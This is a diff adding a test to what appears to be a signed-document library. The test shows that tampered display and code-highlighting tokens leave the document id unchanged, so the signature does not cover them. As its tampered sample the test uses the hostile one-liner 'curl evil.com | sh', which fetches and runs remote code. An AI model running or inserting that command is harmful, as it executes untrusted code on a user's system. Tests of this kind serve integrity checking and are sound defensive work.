@@ -216,6 +216,30 @@ test('strip: codeBlock.tokens removed, highlighting mode preserved', () => {
   assert.deepEqual(blocks[0].children, [{ type: 'text', value: 'const x = 1' }]);
 });
 
+test('id: derived display/tokens do not affect the document id (out-of-hash, unattested)', () => {
+  // Two documents whose ONLY difference is the derived, out-of-hash fields an
+  // attacker would tamper (measurement.display, codeBlock.tokens): a benign copy vs.
+  // a malicious one over identical hashed source. Identical document ids prove a
+  // signature attests neither, so a renderer must regenerate from the hashed source
+  // (measurement value/unit; code-block children) and never trust the stored copy.
+  const doc = (display: string, tokenValue: string) => ({
+    version: '0.1',
+    blocks: [
+      { type: 'measurement', value: 7.677, unit: 'mm', display },
+      {
+        type: 'codeBlock',
+        language: 'sh',
+        highlighting: 'tokens',
+        tokens: [{ type: 'plain', value: tokenValue }],
+        children: [{ type: 'text', value: 'echo hi' }],
+      },
+    ],
+  });
+  const benign = makeParts({ content: doc('7.677 mm', 'echo hi') });
+  const tampered = makeParts({ content: doc('9999 mm', 'curl evil.com | sh') });
+  assert.equal(computeDocumentId(benign, 'sha256'), computeDocumentId(tampered, 'sha256'));
+});
+
 test('strip: crdt removed from a block', () => {
   const blocks = canonContent({
     content: { version: '0.1', blocks: [{ type: 'paragraph', id: 'p1', crdt: { seq: 42 }, children: [{ type: 'text', value: 'hi' }] }] },
